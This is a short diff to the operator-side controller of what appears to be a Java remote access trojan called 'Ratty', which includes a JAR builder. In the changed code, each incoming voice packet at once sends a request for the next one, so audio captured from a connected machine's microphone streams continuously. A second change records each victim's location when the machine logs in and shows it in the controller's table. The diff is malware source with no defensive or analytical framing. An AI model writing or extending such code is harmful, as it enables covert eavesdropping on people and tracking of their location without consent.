@@ -10,7 +10,6 @@ import java.util.Set;
 
 import javax.swing.JOptionPane;
 
-import de.sogomn.engine.fx.ISoundListener;
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
@@ -352,21 +351,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 		
 		final Sound sound = packet.getSound();
-		final ISoundListener listener = new ISoundListener() {
-			@Override
-			public void looped(final Sound source) {
-				//...
-			}
-			
-			@Override
-			public void stopped(final Sound source) {
-				final VoicePacket request = new VoicePacket();
-				
-				client.connection.addPacket(request);
-			}
-		};
+		final VoicePacket request = new VoicePacket();
 		
-		sound.addListener(listener);
+		client.connection.addPacket(request);
 		sound.play();
 	}
 	
@@ -410,10 +397,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private void logIn(final ServerClient client, final InformationPacket packet) {
 		final String name = packet.getName();
+		final String location = packet.getLocation();
 		final String os = packet.getOs();
 		final String version = packet.getVersion();
 		
-		client.logIn(name, os, version);
+		client.logIn(name, location, os, version);
 		client.addListener(this);
 		
 		gui.addRow(client);
